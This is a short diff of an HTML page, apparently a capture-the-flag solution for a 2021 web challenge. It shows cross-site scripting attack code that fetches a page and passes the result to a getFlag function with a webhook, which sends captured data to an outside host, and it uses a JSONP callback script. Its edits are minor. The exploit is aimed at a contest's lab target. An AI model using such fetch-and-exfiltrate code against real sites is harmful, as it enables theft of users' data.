@@ -34,11 +34,10 @@ layout: xss
 
     let options = {
         mode: 'no-cors' // 'cors' by default
-    }
+    };
     fetch(noCorsUrl, options)
         .then(res => res.text)
         .then(text => getFlag(webhook, text));
 
+    //<script src="https://jason.2021.chall.actf.co/languages?callback=load" referrerpolicy="no-referrer">
 </script>
-
-<!-- <script src="https://jason.2021.chall.actf.co/languages?callback=load" referrerpolicy="no-referrer"></script> -->
